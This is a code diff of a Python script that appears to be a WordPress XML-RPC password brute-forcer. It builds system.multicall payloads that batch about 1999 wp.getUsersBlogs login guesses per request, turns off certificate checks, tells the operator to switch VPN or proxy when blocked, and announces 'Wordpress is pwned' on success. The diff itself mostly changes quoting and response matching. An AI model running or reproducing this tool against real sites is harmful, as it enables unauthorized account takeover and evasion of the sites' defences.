@@ -22,14 +22,14 @@ WAIT_TIME = 5
 PASSWD_PER_REQUEST = 1999
 
 class bcolors:
-	HEADER = '\033[95m'
-	OKBLUE = '\033[94m'
-	OKGREEN = '\033[92m'
-	WARNING = '\033[93m'
-	FAIL = '\033[91m'
-	ENDC = '\033[0m'
-	BOLD = '\033[1m'
-	UNDERLINE = '\033[4m'
+	HEADER = "\033[95m"
+	OKBLUE = "\033[94m"
+	OKGREEN = "\033[92m"
+	WARNING = "\033[93m"
+	FAIL = "\033[91m"
+	ENDC = "\033[0m"
+	BOLD = "\033[1m"
+	UNDERLINE = "\033[4m"
 
 
 def banner(argv, usage=False, url=None, users=None):
@@ -45,7 +45,7 @@ def banner(argv, usage=False, url=None, users=None):
 	print(bcolors.OKBLUE +
 		  "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
 	print(bcolors.OKBLUE +
-		  '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
+		  "        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__" + bcolors.ENDC)
 	print(bcolors.OKBLUE + "" + bcolors.ENDC)
 	print("")
 	print(bcolors.OKBLUE +
@@ -64,37 +64,41 @@ def send_request(url, data):
 	ctx.check_hostname = False
 	ctx.verify_mode = ssl.CERT_NONE
 	req = requests.post(url, data, headers={
-		'Content-Type': 'application/xml'})
-	rsp = req.content.decode('utf-8')
+		"Content-Type": "application/xml"})
+	rsp = req.content.decode("utf-8")
 	return rsp
 
 
 def check_response(content, user, passwd):
 	if "incorrect" in content.lower():
-		print(bcolors.FAIL + "+ -- --=[Wrong username or password: " +
+		print(bcolors.FAIL + "+ -- --=[Wrong password: " +
 			  user + "/" + passwd + "" + bcolors.ENDC)
+	if "not registered on this site" in content:
+		print(bcolors.FAIL + "+ -- --=[User not registered on this site: " +
+			  user + "" + bcolors.ENDC)
+		sys.exit(0)
 	elif "Access from your IP address has been blocked for security reasons" in content:
 		print(bcolors.FAIL + "+ -- --=[Access from your IP has been blocked! Try using a different VPN/proxy.")
 		sys.exit(0)
 	elif "500 Internal Server Error" in content:
-		print(bcolors.WARNING + "+ -- --=[There was an error on the server, exiting:" + content + bcolors.ENDC)
+		print(bcolors.WARNING + "+ -- --=[There was an error on the server, exiting:\n\n" + content + bcolors.ENDC)
 		sys.exit(0)
-	elif "admin" in content.lower():
+	elif "isAdmin" in content:
 		print(bcolors.OKGREEN +
 			  "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC)
 		sys.exit(0)
 	else:
 		print(bcolors.WARNING +
-			  "+ -- --=[Invalid response from target" + bcolors.ENDC)
+			  "+ -- --=[Invalid response from the target: " + content + bcolors.ENDC)
 		sys.exit(0)
 
 
 def template(entries):
-	t = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
+	t = "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
 	for entry in entries:
 		t += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>" % (
-			entry.get('user'), entry.get('passwd'))
-	t += '</data></array></value></param></params></methodCall>'
+			entry.get("user"), entry.get("passwd"))
+	t += "</data></array></value></param></params></methodCall>"
 	return t
 
 
@@ -109,10 +113,10 @@ def find_one(entries):
 	for entry in entries:
 		t = template([entry])
 		content = send_request(url, t)
-		check_response(content, entry.get('user'), entry.get('passwd'))
+		check_response(content, entry.get("user"), entry.get("passwd"))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
 	if len(sys.argv) < 3:
 		banner(sys.argv, True)
 
@@ -122,7 +126,7 @@ if __name__ == '__main__':
 
 	banner(sys.argv, False, url, users)
 
-	with open(wordlist, 'r', errors='replace') as f:
+	with open(wordlist, "r", errors="replace") as f:
 		passwds = f.read().splitlines()
 
 	entries = []
